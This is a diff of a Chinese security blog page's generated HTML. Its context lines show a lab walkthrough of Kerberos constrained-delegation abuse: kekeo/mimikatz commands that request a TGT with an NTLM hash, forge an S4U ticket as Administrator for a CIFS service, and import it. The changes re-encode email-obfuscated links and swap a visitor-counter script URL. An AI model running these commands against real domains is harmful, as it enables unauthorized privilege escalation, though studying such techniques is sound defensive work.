@@ -1006,7 +1006,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:PC-JACK-0DAY /domain:0day.org /NTLM:768623e06fae601be0c04759c87d93d3 /ticket:test.kirbi</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.bmp.ovh/imgs/2021/10/4377d7c2fc545597.png"></p>
-<p>得到<a href="mailto:&#x54;&#x47;&#84;&#x5f;&#80;&#67;&#x2d;&#74;&#x41;&#67;&#x4b;&#45;&#x30;&#x44;&#x41;&#x59;&#x40;&#x30;&#68;&#65;&#x59;&#46;&#x4f;&#x52;&#71;&#x5f;&#107;&#114;&#x62;&#x74;&#103;&#x74;">&#x54;&#x47;&#84;&#x5f;&#80;&#67;&#x2d;&#74;&#x41;&#67;&#x4b;&#45;&#x30;&#x44;&#x41;&#x59;&#x40;&#x30;&#68;&#65;&#x59;&#46;&#x4f;&#x52;&#71;&#x5f;&#107;&#114;&#x62;&#x74;&#103;&#x74;</a>~<a href="mailto:&#48;&#x64;&#97;&#121;&#x2e;&#111;&#x72;&#x67;&#64;&#x30;&#68;&#65;&#89;&#46;&#79;&#82;&#x47;&#46;&#x6b;&#x69;&#x72;&#x62;&#x69;">&#48;&#x64;&#97;&#121;&#x2e;&#111;&#x72;&#x67;&#64;&#x30;&#68;&#65;&#89;&#46;&#79;&#82;&#x47;&#46;&#x6b;&#x69;&#x72;&#x62;&#x69;</a></p>
+<p>得到<a href="mailto:&#84;&#x47;&#x54;&#x5f;&#x50;&#67;&#x2d;&#74;&#65;&#x43;&#x4b;&#x2d;&#48;&#x44;&#x41;&#x59;&#64;&#48;&#x44;&#x41;&#89;&#46;&#79;&#82;&#x47;&#95;&#107;&#x72;&#98;&#x74;&#103;&#116;">&#84;&#x47;&#x54;&#x5f;&#x50;&#67;&#x2d;&#74;&#65;&#x43;&#x4b;&#x2d;&#48;&#x44;&#x41;&#x59;&#64;&#48;&#x44;&#x41;&#89;&#46;&#79;&#82;&#x47;&#95;&#107;&#x72;&#98;&#x74;&#103;&#116;</a>~<a href="mailto:&#48;&#x64;&#97;&#x79;&#x2e;&#111;&#x72;&#103;&#x40;&#x30;&#68;&#65;&#x59;&#46;&#x4f;&#x52;&#71;&#x2e;&#107;&#105;&#x72;&#98;&#x69;">&#48;&#x64;&#97;&#x79;&#x2e;&#111;&#x72;&#103;&#x40;&#x30;&#68;&#65;&#x59;&#46;&#x4f;&#x52;&#71;&#x2e;&#107;&#105;&#x72;&#98;&#x69;</a></p>
 <h3 id="3-获取ST"><a href="#3-获取ST" class="headerlink" title="3.获取ST"></a>3.获取ST</h3><p>然后我们可以使用这张TGT通过伪造s4u请求以<code>administrator</code>用户身份请求访问<code>OWA2010SP3 CIFS</code>的ST</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_PC-JACK-0DAY@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>
 
@@ -1108,7 +1108,7 @@
 
 
 <p><img src="https://i.bmp.ovh/imgs/2021/10/b7b9d716c74d6bda.png"></p>
-<p>可以看到生成了<a href="mailto:&#84;&#71;&#x54;&#95;&#106;&#x61;&#99;&#x6b;&#x40;&#48;&#100;&#x61;&#x79;&#46;&#111;&#x72;&#103;&#46;&#x63;&#x63;&#97;&#99;&#104;&#x65;">&#84;&#71;&#x54;&#95;&#106;&#x61;&#99;&#x6b;&#x40;&#48;&#100;&#x61;&#x79;&#46;&#111;&#x72;&#103;&#46;&#x63;&#x63;&#97;&#99;&#104;&#x65;</a></p>
+<p>可以看到生成了<a href="mailto:&#x54;&#71;&#x54;&#x5f;&#x6a;&#97;&#99;&#107;&#x40;&#x30;&#x64;&#97;&#121;&#46;&#111;&#114;&#x67;&#x2e;&#99;&#99;&#x61;&#x63;&#x68;&#101;">&#x54;&#71;&#x54;&#x5f;&#x6a;&#97;&#99;&#107;&#x40;&#x30;&#x64;&#97;&#121;&#46;&#111;&#114;&#x67;&#x2e;&#99;&#99;&#x61;&#x63;&#x68;&#101;</a></p>
 <p><strong>2.mimikatz导入票据</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc 票据路径</span><br></pre></td></tr></table></figure>
 
@@ -1585,7 +1585,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
@@ -1595,15 +1595,9 @@
   
 </div>
 
-<!--网站访问人数-->
 <div class="powered-by">
-<i class="fa fa-user"></i><span id="busuanzi_container_site_uv">
-  <span id="busuanzi_value_site_uv"></span>
-</span>
-<!--网站访问次数-->
-<span class="post-meta-divider">|</span>
-<span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i>
-    <span id="busuanzi_value_site_pv"></span>
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
 </span>
 </div>
 
